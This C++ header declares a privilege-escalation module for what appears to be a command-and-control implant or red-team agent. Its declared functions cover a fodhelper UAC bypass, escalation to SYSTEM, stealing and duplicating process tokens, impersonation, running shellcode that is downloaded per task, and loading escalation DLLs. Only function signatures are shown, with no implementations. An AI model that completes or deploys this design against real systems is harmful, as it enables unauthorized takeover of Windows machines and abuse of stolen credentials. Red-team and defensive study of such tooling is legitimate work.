#pragma once

#include "json.hpp"
#include <string>
#include <vector>
#include <windows.h>

using json = nlohmann::json;

namespace Tasks {
namespace Privilege {

    // Privilege escalation method enumeration
    enum class EscalationMethod {
        FODHELPER_UAC_BYPASS = 1,
        TOKEN_DUPLICATION = 2,
        SERVICE_CREATION = 3,
        REGISTRY_HIJACK = 4,
        NAMED_PIPE_IMPERSONATION = 5
    };

    // Privilege operation result structure
    struct PrivilegeResult {
        bool success;
        std::string message;
        std::string output;
        int errorCode;
        
        PrivilegeResult(bool s = false, const std::string& msg = "", const std::string& out = "", int err = 0)
            : success(s), message(msg), output(out), errorCode(err) {}
    };

    // Token information structure
    struct TokenInfo {
        std::string username;
        std::string domain;
        std::string sid;
        int integrityLevel;
        bool isElevated;
        std::vector<std::string> privileges;
        
        TokenInfo() : integrityLevel(0), isElevated(false) {}
    };

    /**
     * Attempt to bypass UAC using the specified method
     * @param method UAC bypass method to use
     * @param command Command to execute with elevated privileges
     * @return PrivilegeResult with operation status and details
     */
    PrivilegeResult BypassUAC(EscalationMethod method, const std::string& command);

    /**
     * Attempt to escalate to SYSTEM privileges using the specified method
     * @param method Privilege escalation method to use
     * @param command Command to execute as SYSTEM
     * @return PrivilegeResult with operation status and details
     */
    PrivilegeResult GetSystem(EscalationMethod method, const std::string& command);

    /**
     * Execute privilege manipulation shellcode (setpriv functionality)
     * @param task JSON task containing file_id for shellcode download
     * @return PrivilegeResult with execution status
     */
    PrivilegeResult ExecuteSetPriv(const json& task);

    /**
     * Execute privilege listing shellcode (listprivs functionality)
     * @param task JSON task containing file_id for shellcode download
     * @return PrivilegeResult with privilege listing output
     */
    PrivilegeResult ExecuteListPrivs(const json& task);

    /**
     * Get current process token information
     * @return TokenInfo structure with current token details
     */
    TokenInfo GetCurrentTokenInfo();

    /**
     * Get token information for a specific process
     * @param processId Process ID to query
     * @return TokenInfo structure with process token details
     */
    TokenInfo GetProcessTokenInfo(DWORD processId);

    /**
     * Check if current process is running with elevated privileges
     * @return true if process is elevated (high integrity)
     */
    bool IsProcessElevated();

    /**
     * Check if current process is running as SYSTEM
     * @return true if running as SYSTEM account
     */
    bool IsRunningAsSystem();

    /**
     * Enable a specific privilege for the current process
     * @param privilegeName Name of the privilege (e.g., "SeDebugPrivilege")
     * @param enable Whether to enable (true) or disable (false) the privilege
     * @return true if privilege adjustment successful
     */
    bool AdjustPrivilege(const std::string& privilegeName, bool enable = true);

    /**
     * Get list of all privileges available to current token
     * @param enabledOnly Whether to return only enabled privileges
     * @return Vector of privilege names
     */
    std::vector<std::string> GetTokenPrivileges(bool enabledOnly = false);

    /**
     * Check if a specific privilege is enabled for current token
     * @param privilegeName Name of the privilege to check
     * @return true if privilege is enabled
     */
    bool HasPrivilege(const std::string& privilegeName);

    /**
     * Impersonate a process token
     * @param processId Process ID to impersonate
     * @return true if impersonation successful
     */
    bool ImpersonateProcess(DWORD processId);

    /**
     * Revert impersonation back to original token
     * @return true if revert successful
     */
    bool RevertImpersonation();

    /**
     * Create a new process with specified token
     * @param tokenHandle Token to use for new process
     * @param applicationPath Path to executable
     * @param commandLine Command line arguments
     * @return Process ID of created process, 0 if failed
     */
    DWORD CreateProcessWithToken(HANDLE tokenHandle, const std::string& applicationPath, const std::string& commandLine = "");

    /**
     * Steal token from a higher privileged process
     * @param targetProcessId Process ID to steal token from
     * @return Handle to duplicated token, NULL if failed
     */
    HANDLE StealProcessToken(DWORD targetProcessId);

    /**
     * Get the integrity level of current process
     * @return Integrity level (1=Low, 2=Medium, 3=High, 4=System)
     */
    int GetProcessIntegrityLevel();

    /**
     * Check if UAC is enabled on the system
     * @return true if UAC is enabled
     */
    bool IsUACEnabled();

    /**
     * Get current user's SID
     * @return SID as string, empty if failed
     */
    std::string GetCurrentUserSID();

    /**
     * Check if current user is in the Administrators group
     * @return true if user is admin
     */
    bool IsUserAdmin();

    /**
     * Validate that DLL modules exist for privilege operations
     * @param method Method that requires DLL validation
     * @return true if required DLLs are available
     */
    bool ValidateRequiredModules(EscalationMethod method);

    /**
     * Load and execute a privilege escalation DLL
     * @param dllPath Path to the privilege escalation DLL
     * @param functionName Function name to call in DLL
     * @param parameters Parameters to pass to function
     * @return PrivilegeResult with execution status
     */
    PrivilegeResult ExecutePrivilegeDLL(const std::string& dllPath, const std::string& functionName, const std::string& parameters);

    /**
     * Create a formatted privilege report
     * @param includeTokenInfo Whether to include detailed token information
     * @return Formatted string with privilege information
     */
    std::string GeneratePrivilegeReport(bool includeTokenInfo = true);

} // namespace Privilege
} // namespace Tasks